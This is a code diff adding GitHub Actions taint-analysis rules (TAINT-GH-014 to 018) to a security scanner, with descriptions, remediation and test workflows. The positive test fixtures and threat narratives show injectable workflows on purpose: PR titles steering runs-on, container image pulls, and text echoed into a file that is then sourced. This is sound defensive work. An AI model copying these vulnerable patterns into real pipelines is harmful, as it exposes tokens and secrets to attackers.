@@ -30,88 +30,34 @@ Current roster:
   producer job's declared output carries attacker bytes; a
   consumer job references it via
   ``${{ needs.<j>.outputs.<n> }}`` and it lands in a shell sink.
+* **TAINT-GH-014** — attacker-controlled context (cross-job output
+  or env-mediated) reaches a job's ``runs-on:`` — self-hosted
+  runner / label hijack.
+* **TAINT-GH-015** — attacker-controlled context reaches a job
+  ``container.image:`` / ``services.*.image:`` — attacker-controlled
+  image pull.
+
+(TAINT-GH-010..013 are regex / context rules for adjacent shapes —
+workflow_run checkout pinning, multi-trigger idempotency, the
+safely-quoted lint companion, and github-script JS injection.)
 """
 
 from __future__ import annotations
 
-import re
 from dataclasses import dataclass, field
 
-from taintly.models import BlockPattern, ContextPattern, Platform, Rule, Severity
-from taintly.taint import TaintPath, _shell_quote_context_at
+from taintly.models import BlockPattern, ContextPattern, Platform, RegexPattern, Rule, Severity
+from taintly.taint import TaintPath, _sink_is_safely_quoted
 from taintly.taint import analyze as taint_analyze
-from taintly.workflow_aware_pattern import WorkflowAwarePattern
-
-# TAINT-GH-006 — match ``${{ inputs.<name> }}`` references inside a
-# scalar value.  Used by the WorkflowAwarePattern predicate to fire
-# only when an inputs reference reaches a shell sink and the file is
-# a reusable workflow (``on: workflow_call``).
-_INPUTS_REF_RE = re.compile(r"\$\{\{\s*inputs\.[A-Za-z_][\w-]*\s*\}\}")
-
-
-def _taint_gh_006_predicate(
-    value: str,
-    _value_kind: str,
-    _path: tuple[object, ...],
-    ctx,
-) -> bool:
-    """Predicate for TAINT-GH-006 — caller-graph form.
-
-    Fires when:
-
-    * the leaf's value contains an ``${{ inputs.X }}`` reference
-    * the file is a reusable workflow (``on: workflow_call``)
-    * AND the caller-graph analysis does not prove the input is
-      always literal-only
-
-    Caller-graph suppression: if at least one in-repo caller exists
-    AND every caller's ``with:`` map for this callee passes literal
-    or matrix-literal values to the input (no attacker-reachable
-    context — see ``_ATTACKER_REACHABLE_CONTEXT_RE``), the rule
-    suppresses.  Callees with no in-repo callers keep firing as
-    callee-side review-needed warnings.
-    """
-    if not _INPUTS_REF_RE.search(value or ""):
-        return False
-    if not ctx.is_reusable_workflow():
-        return False
-    callers = ctx.find_callers_of_self()
-    return not (callers and all(c.passes_only_literals() for c in callers))
-
 
 # ---------------------------------------------------------------------------
 # Pattern adapter
 # ---------------------------------------------------------------------------
 
-
-# Lines where double-quoting is NOT enough — the quoted value is
-# re-parsed as code by an explicit eval-class command. Used by the
-# ``sink_quote_filter`` partition to keep these in the HIGH-severity
-# rule even when the variable reference itself is double-quoted.
-_REPARSING_CMD_RE = re.compile(
-    r"\b(?:eval|sh\s+-c|bash\s+-c|zsh\s+-c|"
-    r"python(?:3)?\s+-c|perl\s+-e|ruby\s+-e|node\s+-e)\b"
-)
-
-
-def _sink_is_safely_quoted(snippet: str, var_name: str) -> bool:
-    """True if every shell reference to ``var_name`` in ``snippet`` is
-    double-quoted AND the line contains no eval-class re-parsing
-    command. Server-side ``${{ env.X }}`` references (resolved before
-    the shell runs) are out of scope here — quoting doesn't apply.
-    """
-    if _REPARSING_CMD_RE.search(snippet):
-        return False
-    found_any = False
-    for m in re.finditer(rf"\$\{{?{re.escape(var_name)}\}}?\b", snippet):
-        found_any = True
-        if _shell_quote_context_at(snippet, m.start()) != "double":
-            return False
-    # If we found no shell-form reference at all, the sink reaches the
-    # variable via ``${{ env.X }}`` server-side substitution — treat as
-    # NOT-safely-quoted because the value is interpolated by GitHub
-    # before any shell quoting can apply.
-    return found_any
+# ``_sink_is_safely_quoted`` lives in ``taintly.taint`` (core) so the
+# dangerous-combination join (``taintly.combination_facts``) can share
+# it without the rule pack becoming a dependency of core.  Imported
+# above; still reachable as ``rules.github.taint._sink_is_safely_quoted``.
 
 
 @dataclass
@@ -145,6 +91,24 @@ class TaintPattern:
     exclude: list[str] = field(default_factory=list)
     kind_filter: str | None = None
     sink_quote_filter: str | None = None
+    # Which sink class(es) to surface.  Defaults to ``"run"`` — a shell
+    # ``run:`` block — so every existing rule keeps its exact
+    # behaviour.  Non-run sink classes (``"runs_on"``,
+    # ``"container_image"``, ``"service_image"``) are opt-in: a rule
+    # sets ``sink_kind_filter`` to surface taint that lands in that
+    # job key instead of (or as well as) ``run:``.  Accepts a single
+    # kind or a tuple of kinds (e.g. one rule covering both
+    # ``container_image`` and ``service_image`` — the same attack
+    # class, attacker-controlled image pull).
+    sink_kind_filter: str | tuple[str, ...] = "run"
+    # Which *source* class to surface.  ``"attacker"`` (default) —
+    # only literal attacker-controlled contexts (``github.event.*``,
+    # ``github.head_ref``, ...).  ``"inputs"`` — only reusable-workflow
+    # ``${{ inputs.<name> }}`` sources (conditional taint; the caller
+    # decides — review-needed; see TAINT-GH-017).  ``"all"`` — both.
+    # The default keeps every pre-existing rule's behaviour: an
+    # ``inputs.*`` flow never reaches an attacker-context rule.
+    source_filter: str = "attacker"
 
     # CONTRACT: returns (line_num, snippet) where line_num is the
     # taint sink's source line, and snippet is the rendered provenance
@@ -153,7 +117,19 @@ class TaintPattern:
     # see taintly._pattern_contract.
     def check(self, content: str, lines: list[str]) -> list[tuple[int, str]]:
         out: list[tuple[int, str]] = []
+        allowed_sinks = (
+            (self.sink_kind_filter,)
+            if isinstance(self.sink_kind_filter, str)
+            else self.sink_kind_filter
+        )
         for path in taint_analyze(content, lines):
+            if path.sink_kind not in allowed_sinks:
+                continue
+            is_input_source = path.source_expr.startswith("inputs.")
+            if self.source_filter == "attacker" and is_input_source:
+                continue
+            if self.source_filter == "inputs" and not is_input_source:
+                continue
             if self.kind_filter is not None and path.kind != self.kind_filter:
                 continue
             if self.sink_quote_filter is not None:
@@ -1153,38 +1129,38 @@ RULES = [
             "confirm the input is either a trusted context (SHA, ref, "
             "actor login on a push-only trigger) or properly sanitised."
         ),
-        # WorkflowAwarePattern form fires only on SHELL SINKS —
-        # ``run:``, ``with: args/entrypoint/script/command``.
-        # Identifier sinks (``name:``, ``id:``, ``outputs.x:``,
-        # ``environment:``, ``tag_name:``, ``timeout-minutes:``)
-        # cannot execute the substituted bytes; their FP density
-        # was the dominant noise source under the prior any-line
-        # form.
-        #
-        # The reusable-workflow gate (``on: workflow_call``) is
-        # checked via ``ctx.is_reusable_workflow()`` which covers
-        # the three legal shapes (bare, block, list).
-        #
-        # Caller-graph suppression: when EVERY in-repo caller of
-        # this reusable workflow passes literal / matrix-literal
-        # values to the input (no attacker-reachable context), the
-        # rule
-        # suppresses.  Sample-and-label of 21 corpus fires found
-        # 19/21 FP because of this exact shape (matrix-driven fan-
-        # out into a callee that takes inputs).  The suppression
-        # only applies when at least one caller is found in the
-        # local ``.github/workflows/`` tree — externally-callable
-        # reusable workflows (no in-repo callers) keep firing as
-        # callee-side review-needed warnings.
-        pattern=WorkflowAwarePattern(
-            path=[
-                "jobs.*.steps[*].run",
-                "jobs.*.steps[*].with.args",
-                "jobs.*.steps[*].with.entrypoint",
-                "jobs.*.steps[*].with.script",
-                "jobs.*.steps[*].with.command",
+        pattern=ContextPattern(
+            anchor=r"\$\{\{\s*inputs\.[A-Za-z_][\w-]*\s*\}\}",
+            # File must be a reusable workflow. Three legal shapes of
+            # ``on: workflow_call``: bare string, flow-style list, or
+            # block-style nested key.  The ``\b`` on workflow_call
+            # protects against a user-defined event name that
+            # contained the substring (none exists today, forward-proof).
+            requires=(
+                r"(?m)^on:\s*workflow_call\s*(?:#.*)?$"
+                r"|^on:\s*\[[^\]]*\bworkflow_call\b"
+                r"|^\s+\bworkflow_call\s*:"
+            ),
+            exclude=[
+                # Schema-definition lines — inputs referenced in the
+                # declaration block itself aren't shell sinks.
+                r"^\s*(?:description|default|type|required)\s*:",
+                # Conditionals are evaluated by the Actions engine, not
+                # by bash.  Follow the same carve-out the existing
+                # TAINT rules apply for ``if:`` lines.
+                r"^\s*if\s*:",
+                # Structural / inert YAML scalar fields — the engine
+                # validates these before any shell sees them:
+                #   timeout-minutes  — numeric only, engine rejects non-numeric
+                #   concurrency      — grouping key, never reaches a shell
+                # Keep ``runs-on:`` / ``container:`` / ``image:`` IN — those
+                # do have real threats (self-hosted runner hijack, attacker-
+                # controlled container image pull) that belong in the audit.
+                r"^\s*(?:timeout-minutes|concurrency)\s*:",
+                # Comment-only lines.
+                r"^\s*#",
             ],
-            predicate=_taint_gh_006_predicate,
+            scope="file",
         ),
         remediation=(
             "Do one of:\n"
@@ -2490,5 +2466,752 @@ RULES = [
         incidents=[
             "tj-actions/changed-files (CVE-2025-30066, March 2025)",
         ],
+    ),
+    # =========================================================================
+    # TAINT-GH-014 — attacker-controlled value reaches a job's runs-on:
+    # =========================================================================
+    Rule(
+        id="TAINT-GH-014",
+        title=(
+            "Attacker-controlled context flows into a job's runs-on: "
+            "(self-hosted runner / label hijack)"
+        ),
+        severity=Severity.HIGH,
+        platform=Platform.GITHUB,
+        owasp_cicd="CICD-SEC-4",
+        description=(
+            "A job's ``runs-on:`` value is interpolated from an "
+            "attacker-controlled GitHub context — either across a job "
+            "boundary via ``${{ needs.<j>.outputs.<n> }}`` (a producer "
+            "job declared an output sourced from "
+            "``github.event.pull_request.title``, ``github.head_ref``, "
+            "issue / comment bodies, ...) or within the job via "
+            "``${{ env.X }}`` where ``X`` resolves to attacker bytes.\n"
+            "\n"
+            "``runs-on:`` selects which runner — and which runner "
+            "*labels* — the job is dispatched to.  When the attacker "
+            "controls that string they can steer the job onto a "
+            "runner pool they influence: a self-hosted runner they "
+            "registered against a loosely-scoped label, or a label "
+            "that collides with a less-trusted pool.  The job then "
+            "executes with its full ``GITHUB_TOKEN`` and bound "
+            "secrets on infrastructure the attacker chose.  This is "
+            "the ``runs-on:`` analog of the cross-job ``run:`` sink "
+            "(TAINT-GH-009); the value is server-side substituted at "
+            "workflow-parse time, so no shell quoting protects it."
+        ),
+        pattern=TaintPattern(sink_kind_filter="runs_on"),
+        remediation=(
+            "Never derive ``runs-on:`` from attacker-controlled "
+            "context.  Pin it to a static label, or — if a job must "
+            "select its runner dynamically — drive the choice from a "
+            "trusted input only (a ``workflow_dispatch`` input gated "
+            "by repository permissions, a value validated against an "
+            "allow-list at the producer's ``outputs:`` boundary):\n"
+            "\n"
+            "    # BAD — PR author picks the runner\n"
+            "    runs-on: ${{ needs.pick.outputs.runner }}\n"
+            "\n"
+            "    # GOOD — static, or allow-listed at the producer\n"
+            "    runs-on: ubuntu-latest\n"
+            "\n"
+            "Also scope self-hosted runner labels tightly: a runner "
+            "should never answer to a label a PR-triggered job can "
+            "name."
+        ),
+        reference="https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions",
+        test_positive=[
+            # Cross-job: producer output is attacker-controlled, consumer
+            # interpolates it into runs-on:.
+            (
+                "on: pull_request_target\n"
+                "jobs:\n"
+                "  pick:\n"
+                "    runs-on: ubuntu-latest\n"
+                "    outputs:\n"
+                "      runner: ${{ github.event.pull_request.title }}\n"
+                "    steps:\n"
+                "      - run: echo hi\n"
+                "  build:\n"
+                "    needs: pick\n"
+                "    runs-on: ${{ needs.pick.outputs.runner }}\n"
+                "    steps:\n"
+                "      - run: echo hi\n"
+            ),
+            # Env-mediated: a tainted job-level env var reaches runs-on:.
+            (
+                "on: pull_request_target\n"
+                "jobs:\n"
+                "  build:\n"
+                "    runs-on: ${{ env.RUNNER }}\n"
+                "    env:\n"
+                "      RUNNER: ${{ github.head_ref }}\n"
+                "    steps:\n"
+                "      - run: echo hi\n"
+            ),
+        ],
+        test_negative=[
+            # Static runs-on: — the safe default.
+            (
+                "on: pull_request_target\n"
+                "jobs:\n"
+                "  build:\n"
+                "    runs-on: ubuntu-latest\n"
+                "    steps:\n"
+                "      - run: echo hi\n"
+            ),
+            # Cross-job reference into runs-on:, but the producer's
+            # output is a static literal — no attacker bytes flow.
+            (
+                "on: pull_request_target\n"
+                "jobs:\n"
+                "  pick:\n"
+                "    runs-on: ubuntu-latest\n"
+                "    outputs:\n"
+                "      runner: self-hosted\n"
+                "    steps:\n"
+                "      - run: echo hi\n"
+                "  build:\n"
+                "    needs: pick\n"
+                "    runs-on: ${{ needs.pick.outputs.runner }}\n"
+                "    steps:\n"
+                "      - run: echo hi\n"
+            ),
+            # Env-mediated runs-on:, but the env var is github.sha —
+            # not attacker-controlled.
+            (
+                "on: pull_request_target\n"
+                "jobs:\n"
+                "  build:\n"
+                "    runs-on: ${{ env.RUNNER }}\n"
+                "    env:\n"
+                "      RUNNER: ${{ github.sha }}\n"
+                "    steps:\n"
+                "      - run: echo hi\n"
+            ),
+        ],
+        stride=["T", "E"],
+        threat_narrative=(
+            "An attacker opens a PR whose title (or head ref) is a "
+            "runner label they control.  A producer job forwards that "
+            "context through its ``outputs:`` block; a downstream job "
+            "sets ``runs-on: ${{ needs.<producer>.outputs.<x> }}``.  "
+            "The downstream job — often the privileged one — is "
+            "dispatched to a runner the attacker registered, handing "
+            "them the job's token and secrets on their own machine."
+        ),
+    ),
+    # =========================================================================
+    # TAINT-GH-015 — attacker-controlled value reaches a container /
+    #                service image reference
+    # =========================================================================
+    Rule(
+        id="TAINT-GH-015",
+        title=(
+            "Attacker-controlled context flows into a job container "
+            "or service image (attacker-controlled image pull)"
+        ),
+        severity=Severity.CRITICAL,
+        platform=Platform.GITHUB,
+        owasp_cicd="CICD-SEC-4",
+        description=(
+            "A job's ``container.image:`` (or a ``services.<name>."
+            "image:``) is interpolated from an attacker-controlled "
+            "GitHub context — across a job boundary via "
+            "``${{ needs.<j>.outputs.<n> }}``, or within the job via "
+            "``${{ env.X }}`` resolving to attacker bytes.\n"
+            "\n"
+            "The container image is pulled and executed as the job's "
+            "runtime: every step runs *inside* it, with the job's "
+            "``GITHUB_TOKEN`` and bound secrets mounted.  When the "
+            "attacker controls the image reference they choose the "
+            "code that runs — a direct remote-code-execution sink, "
+            "equivalent in impact to injecting into ``run:`` but "
+            "harder to spot because there is no shell command in the "
+            "YAML.  Service containers are the same: they run "
+            "alongside the job and routinely receive secrets via "
+            "``env:`` / credentials.  The reference is server-side "
+            "substituted at workflow-parse time."
+        ),
+        pattern=TaintPattern(
+            sink_kind_filter=("container_image", "service_image")
+        ),
+        remediation=(
+            "Pin container and service images to a trusted, static "
+            "reference — ideally by digest:\n"
+            "\n"
+            "    # BAD — PR author picks the image\n"
+            "    container:\n"
+            "      image: ${{ needs.resolve.outputs.image }}\n"
+            "\n"
+            "    # GOOD — pinned by digest\n"
+            "    container:\n"
+            "      image: ghcr.io/org/ci-base@sha256:<digest>\n"
+            "\n"
+            "If the image genuinely must vary, resolve it from a "
+            "trusted input and validate it against an allow-list of "
+            "registries / repositories at the producer's "
+            "``outputs:`` boundary — never forward raw "
+            "``github.event.*`` bytes into an image reference."
+        ),
+        reference="https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions",
+        test_positive=[
+            # Cross-job into container.image:.
+            (
+                "on: pull_request_target\n"
+                "jobs:\n"
+                "  resolve:\n"
+                "    runs-on: ubuntu-latest\n"
+                "    outputs:\n"
+                "      image: ${{ github.event.pull_request.head.ref }}\n"
+                "    steps:\n"
+                "      - run: echo hi\n"
+                "  build:\n"
+                "    needs: resolve\n"
+                "    runs-on: ubuntu-latest\n"
+                "    container:\n"
+                "      image: ${{ needs.resolve.outputs.image }}\n"
+                "    steps:\n"
+                "      - run: echo hi\n"
+            ),
+            # Cross-job into a services.<name>.image:.
+            (
+                "on: pull_request_target\n"
+                "jobs:\n"
+                "  resolve:\n"
+                "    runs-on: ubuntu-latest\n"
+                "    outputs:\n"
+                "      image: ${{ github.event.pull_request.title }}\n"
+                "    steps:\n"
+                "      - run: echo hi\n"
+                "  build:\n"
+                "    needs: resolve\n"
+                "    runs-on: ubuntu-latest\n"
+                "    services:\n"
+                "      db:\n"
+                "        image: ${{ needs.resolve.outputs.image }}\n"
+                "    steps:\n"
+                "      - run: echo hi\n"
+            ),
+        ],
+        test_negative=[
+            # Pinned, static container image.
+            (
+                "on: pull_request_target\n"
+                "jobs:\n"
+                "  build:\n"
+                "    runs-on: ubuntu-latest\n"
+                "    container:\n"
+                "      image: ghcr.io/org/ci-base:1.2.3\n"
+                "    steps:\n"
+                "      - run: echo hi\n"
+            ),
+            # Cross-job reference into container.image:, but the
+            # producer's output is a static literal.
+            (
+                "on: pull_request_target\n"
+                "jobs:\n"
+                "  resolve:\n"
+                "    runs-on: ubuntu-latest\n"
+                "    outputs:\n"
+                "      image: node:18\n"
+                "    steps:\n"
+                "      - run: echo hi\n"
+                "  build:\n"
+                "    needs: resolve\n"
+                "    runs-on: ubuntu-latest\n"
+                "    container:\n"
+                "      image: ${{ needs.resolve.outputs.image }}\n"
+                "    steps:\n"
+                "      - run: echo hi\n"
+            ),
+            # Static service image.
+            (
+                "on: pull_request_target\n"
+                "jobs:\n"
+                "  build:\n"
+                "    runs-on: ubuntu-latest\n"
+                "    services:\n"
+                "      db:\n"
+                "        image: postgres:15\n"
+                "    steps:\n"
+                "      - run: echo hi\n"
+            ),
+        ],
+        stride=["T", "E"],
+        threat_narrative=(
+            "An attacker opens a PR whose title encodes an image "
+            "reference they publish (``attacker/evil:latest``).  A "
+            "producer job forwards that context through ``outputs:``; "
+            "a downstream job sets ``container.image: "
+            "${{ needs.<producer>.outputs.<x> }}``.  Every step of "
+            "the downstream job then runs inside the attacker's "
+            "image, with the job's token and secrets — full remote "
+            "code execution with no shell command in the workflow."
+        ),
+    ),
+    # =========================================================================
+    # TAINT-GH-016 — attacker-controlled cross-job output gates a job's if:
+    # =========================================================================
+    Rule(
+        id="TAINT-GH-016",
+        title=(
+            "Attacker-controlled cross-job output decides a job's "
+            "if: gate condition (gate suppression / forced run)"
+        ),
+        severity=Severity.MEDIUM,
+        platform=Platform.GITHUB,
+        owasp_cicd="CICD-SEC-4",
+        confidence="medium",
+        review_needed=True,
+        description=(
+            "A job's ``if:`` condition references "
+            "``${{ needs.<j>.outputs.<n> }}`` where the producer job's "
+            "output is derived from an attacker-controlled GitHub "
+            "context (``github.event.pull_request.title``, "
+            "``github.head_ref``, issue / comment bodies, ...).\n"
+            "\n"
+            "``if:`` decides *whether* the job runs.  When the attacker "
+            "controls the value the condition turns on, they control "
+            "the gate: a security / approval / change-detection job "
+            "can be skipped, or a privileged job (deploy, publish, "
+            "release) can be forced to run, on their pull request.\n"
+            "\n"
+            "This is review-needed, not a confirmed risk: whether the "
+            "gated job is *security-relevant* — and therefore whether "
+            "controlling the gate is an actual escalation — depends "
+            "on the workflow's design.  The analyzer flags the flow; "
+            "a reviewer confirms the gate matters."
+        ),
+        pattern=TaintPattern(sink_kind_filter="if"),
+        remediation=(
+            "Don't gate a job on a value that an attacker's PR can "
+            "shape.  Either:\n"
+            "\n"
+            "1. Gate on trusted context only — ``github.ref``, "
+            "   ``github.event_name``, an environment with required "
+            "   reviewers — not on a ``needs.*.outputs.*`` that "
+            "   traces back to ``github.event.*``.\n"
+            "\n"
+            "2. If the gate genuinely must depend on a computed "
+            "   value, compute it from trusted inputs and validate "
+            "   it at the producer's ``outputs:`` boundary (allow-"
+            "   list the possible values) so a PR author can't make "
+            "   it take an unexpected branch.\n"
+            "\n"
+            "3. For privileged jobs, back the gate with a GitHub "
+            "   ``environment:`` protection rule — an ``if:`` alone "
+            "   is not an authorization boundary."
+        ),
+        reference="https://docs.github.com/en/actions/using-jobs/using-conditions-to-control-job-execution",
+        test_positive=[
+            # Producer output is attacker-controlled; a downstream
+            # job's if: depends on it.
+            (
+                "on: pull_request_target\n"
+                "jobs:\n"
+                "  gate:\n"
+                "    runs-on: ubuntu-latest\n"
+                "    outputs:\n"
+                "      ok: ${{ github.event.pull_request.title }}\n"
+                "    steps:\n"
+                "      - run: echo hi\n"
+                "  deploy:\n"
+                "    needs: gate\n"
+                "    if: ${{ needs.gate.outputs.ok == 'true' }}\n"
+                "    runs-on: ubuntu-latest\n"
+                "    steps:\n"
+                "      - run: echo deploy\n"
+            ),
+        ],
+        test_negative=[
+            # Producer output is a static literal — the gate value is
+            # not attacker-controlled.
+            (
+                "on: pull_request_target\n"
+                "jobs:\n"
+                "  gate:\n"
+                "    runs-on: ubuntu-latest\n"
+                "    outputs:\n"
+                "      ok: 'true'\n"
+                "    steps:\n"
+                "      - run: echo hi\n"
+                "  deploy:\n"
+                "    needs: gate\n"
+                "    if: ${{ needs.gate.outputs.ok == 'true' }}\n"
+                "    runs-on: ubuntu-latest\n"
+                "    steps:\n"
+                "      - run: echo deploy\n"
+            ),
+            # if: gated on trusted context only — no cross-job taint.
+            (
+                "jobs:\n"
+                "  deploy:\n"
+                "    if: ${{ github.ref == 'refs/heads/main' }}\n"
+                "    runs-on: ubuntu-latest\n"
+                "    steps:\n"
+                "      - run: echo deploy\n"
+            ),
+        ],
+        stride=["T", "E"],
+        threat_narrative=(
+            "An attacker opens a PR whose title makes a producer "
+            "job's declared output resolve to the value a downstream "
+            "job's ``if:`` is keyed on.  The downstream job — a "
+            "security check that should have blocked the PR, or a "
+            "privileged deploy that should not have run for a fork — "
+            "is suppressed or forced on the attacker's pull request."
+        ),
+    ),
+    # =========================================================================
+    # TAINT-GH-017 — reusable-workflow input laundered into a shell sink
+    # =========================================================================
+    Rule(
+        id="TAINT-GH-017",
+        title=(
+            "Reusable-workflow input propagates through env / step "
+            "outputs into a shell run: block"
+        ),
+        severity=Severity.MEDIUM,
+        platform=Platform.GITHUB,
+        owasp_cicd="CICD-SEC-4",
+        confidence="medium",
+        review_needed=True,
+        description=(
+            "A reusable workflow (``on: workflow_call``) takes a "
+            "``${{ inputs.<name> }}`` value and launders it through "
+            "one or more ``env:`` assignments, ``$GITHUB_ENV`` / "
+            "``$GITHUB_OUTPUT`` writes, or declared job ``outputs:`` "
+            "before it reaches a shell ``run:`` block.\n"
+            "\n"
+            "TAINT-GH-006 flags the *direct* ``${{ inputs.X }}`` "
+            "reference for review; this rule traces the *propagated* "
+            "flow — the multi-hop / env-mediated / cross-job shapes a "
+            "single structural reference check does not follow — so a "
+            "reviewer sees the whole chain from the input boundary to "
+            "the sink.\n"
+            "\n"
+            "Scoped to the *unsafe* sink shape: the laundered value "
+            "reaches the ``run:`` block unquoted, or inside an "
+            "eval-class command (``eval``, ``sh -c``, ...).  A "
+            "double-quoted reference of a plausibly-constrained input "
+            "(a version, a platform) is far lower risk and would "
+            "drown the signal — those are left out of scope.\n"
+            "\n"
+            "Review-needed, not a confirmed risk: whether the input "
+            "actually carries attacker-controlled bytes depends on "
+            "the *callers*.  An input is dangerous when some caller "
+            "forwards ``github.event.pull_request.title``, "
+            "``github.head_ref``, an issue / comment body, or a "
+            "similar attacker-controlled context into it (see "
+            "TAINT-GH-007 for the caller side).  This rule shows the "
+            "callee-side liability so the input contract can be "
+            "audited or hardened."
+        ),
+        pattern=TaintPattern(source_filter="inputs", sink_quote_filter="unsafe_only"),
+        remediation=(
+            "Treat ``inputs.*`` in a reusable workflow as untrusted "
+            "until the input contract proves otherwise:\n"
+            "\n"
+            "1. Document which inputs may carry attacker-controlled "
+            "   data and audit every caller; never let a caller "
+            "   forward ``github.event.*`` / ``github.head_ref`` into "
+            "   such an input unsanitised.\n"
+            "\n"
+            "2. In the callee, never interpolate the input — or a "
+            "   variable laundered from it — directly into ``run:``. "
+            "   Bind it to a quoted env var and reference the "
+            "   variable:\n"
+            "\n"
+            "       env:\n"
+            '         TITLE: "${{ inputs.title }}"\n'
+            '       run: ./tool "$TITLE"\n'
+            "\n"
+            "3. Validate / allow-list the input at the top of the "
+            "   reusable workflow so every downstream step inherits "
+            "   the safe shape."
+        ),
+        reference="https://docs.github.com/en/actions/using-workflows/reusing-workflows#using-inputs-and-secrets-in-a-reusable-workflow",
+        test_positive=[
+            # Reusable workflow: input -> env -> run:.
+            (
+                "on:\n"
+                "  workflow_call:\n"
+                "    inputs:\n"
+                "      pr_title:\n"
+                "        type: string\n"
+                "jobs:\n"
+                "  build:\n"
+                "    runs-on: ubuntu-latest\n"
+                "    env:\n"
+                "      T: ${{ inputs.pr_title }}\n"
+                "    steps:\n"
+                "      - run: echo $T\n"
+            ),
+            # Reusable workflow: input -> multi-hop env -> run:,
+            # reaching the shell unquoted.
+            (
+                "on: workflow_call\n"
+                "jobs:\n"
+                "  build:\n"
+                "    runs-on: ubuntu-latest\n"
+                "    env:\n"
+                "      A: ${{ inputs.ref }}\n"
+                "      B: ${{ env.A }}\n"
+                "    steps:\n"
+                "      - run: git checkout $B\n"
+            ),
+        ],
+        test_negative=[
+            # Not a reusable workflow — ``inputs.*`` is not a source
+            # here (and would be a parse error at runtime anyway).
+            (
+                "on: push\n"
+                "jobs:\n"
+                "  build:\n"
+                "    runs-on: ubuntu-latest\n"
+                "    env:\n"
+                "      T: ${{ inputs.pr_title }}\n"
+                "    steps:\n"
+                '      - run: echo "$T"\n'
+            ),
+            # Reusable workflow, but the input never reaches a shell
+            # sink — it is bound to env and not referenced in run:.
+            (
+                "on: workflow_call\n"
+                "jobs:\n"
+                "  build:\n"
+                "    runs-on: ubuntu-latest\n"
+                "    env:\n"
+                "      T: ${{ inputs.pr_title }}\n"
+                "    steps:\n"
+                "      - run: echo done\n"
+            ),
+            # Reusable workflow, input reaches run: but every reference
+            # is double-quoted — out of scope (the unsafe-quoting
+            # filter drops it; safely-quoted input flows are too noisy
+            # to surface).
+            (
+                "on: workflow_call\n"
+                "jobs:\n"
+                "  build:\n"
+                "    runs-on: ubuntu-latest\n"
+                "    env:\n"
+                "      T: ${{ inputs.pr_title }}\n"
+                "    steps:\n"
+                '      - run: echo "$T"\n'
+            ),
+        ],
+        stride=["T", "E"],
+        threat_narrative=(
+            "A reusable workflow accepts a string input and, as a "
+            "convenience, binds it to an env var that a later step "
+            "interpolates into a shell command.  A caller — perhaps "
+            "one the reusable workflow's author never reviewed — "
+            "forwards ``github.event.pull_request.title`` into that "
+            "input from a PR-triggered pipeline.  The PR title runs "
+            "as a shell command inside the reusable workflow, with "
+            "whatever token and secrets the call was granted."
+        ),
+    ),
+    # =========================================================================
+    # TAINT-GH-018 — attacker-controlled value written to a file the job runs
+    # =========================================================================
+    Rule(
+        id="TAINT-GH-018",
+        title=(
+            "Attacker-controlled context written to a file that a "
+            "later step executes (source / bash / .)"
+        ),
+        severity=Severity.HIGH,
+        platform=Platform.GITHUB,
+        owasp_cicd="CICD-SEC-4",
+        description=(
+            "A ``run:`` step writes an attacker-controlled value — a "
+            "``github.event.*`` field, ``github.head_ref``, an "
+            "env var laundered from one — into a file "
+            "(``echo \"$VAR\" > script.sh``), and a later line (in "
+            "the same step or a subsequent one) *executes* that file "
+            "with ``source`` / ``.`` / ``bash`` / ``sh`` / ``zsh``.\n"
+            "\n"
+            "The workspace persists across steps, so the written file "
+            "is still there when the executing line runs.  Executing "
+            "it runs the attacker's bytes as a shell script with the "
+            "job's ``GITHUB_TOKEN`` and bound secrets — the same "
+            "impact as direct shell injection, but routed through the "
+            "filesystem so a sink scan that only looks at one ``run:`` "
+            "line in isolation misses it.  This is the file-mediated "
+            "analog of the ``$GITHUB_ENV`` bridge (TAINT-GH-003)."
+        ),
+        pattern=TaintPattern(sink_kind_filter="file_exec"),
+        remediation=(
+            "Never build an executable file from attacker-controlled "
+            "data.  If a step must generate a script:\n"
+            "\n"
+            "1. Keep attacker data *out* of the script body — pass it "
+            "   as an argument or an environment variable to a "
+            "   *static*, version-controlled script, and quote it:\n"
+            "\n"
+            "       env:\n"
+            '         TITLE: "${{ github.event.pull_request.title }}"\n'
+            '       run: ./scripts/process.sh "$TITLE"\n'
+            "\n"
+            "2. If the file genuinely must be generated, write only "
+            "   trusted, validated content into it — never raw "
+            "   ``github.event.*`` bytes — and treat anything derived "
+            "   from a PR as data, not code."
+        ),
+        reference="https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions",
+        test_positive=[
+            # Write tainted -> source, same step.
+            (
+                "on: pull_request_target\n"
+                "jobs:\n"
+                "  build:\n"
+                "    runs-on: ubuntu-latest\n"
+                "    steps:\n"
+                "      - env:\n"
+                "          T: ${{ github.event.pull_request.title }}\n"
+                "        run: |\n"
+                '          echo "$T" > /tmp/payload\n'
+                "          source /tmp/payload\n"
+            ),
+            # Write tainted -> bash, across steps.
+            (
+                "on: pull_request_target\n"
+                "jobs:\n"
+                "  build:\n"
+                "    runs-on: ubuntu-latest\n"
+                "    steps:\n"
+                "      - env:\n"
+                "          T: ${{ github.head_ref }}\n"
+                '        run: echo "$T" > setup.sh\n'
+                "      - run: bash setup.sh\n"
+            ),
+        ],
+        test_negative=[
+            # The written content is a static literal — not tainted.
+            (
+                "jobs:\n"
+                "  build:\n"
+                "    runs-on: ubuntu-latest\n"
+                "    steps:\n"
+                "      - run: |\n"
+                '          echo "hello" > /tmp/x\n'
+                "          source /tmp/x\n"
+            ),
+            # Tainted file is written but never executed — only logged.
+            (
+                "on: pull_request_target\n"
+                "jobs:\n"
+                "  build:\n"
+                "    runs-on: ubuntu-latest\n"
+                "    steps:\n"
+                "      - env:\n"
+                "          T: ${{ github.head_ref }}\n"
+                '        run: echo "$T" > /tmp/log\n'
+            ),
+            # Execution comes before the write — the file is not yet
+            # tainted when it runs.
+            (
+                "on: pull_request_target\n"
+                "jobs:\n"
+                "  build:\n"
+                "    runs-on: ubuntu-latest\n"
+                "    steps:\n"
+                "      - run: source /tmp/p\n"
+                "      - env:\n"
+                "          T: ${{ github.head_ref }}\n"
+                '        run: echo "$T" > /tmp/p\n'
+            ),
+        ],
+        stride=["T", "E"],
+        threat_narrative=(
+            "An attacker opens a PR whose title is a shell payload.  "
+            "A workflow step echoes the title into a file — building "
+            "a throwaway script, or logging it — and a later step "
+            "``source``s or ``bash``es that file.  The attacker's "
+            "bytes execute as a shell script with the job's token "
+            "and secrets; a per-line injection scan misses it because "
+            "the dangerous step's ``run:`` only contains "
+            "``bash setup.sh``."
+        ),
+    ),
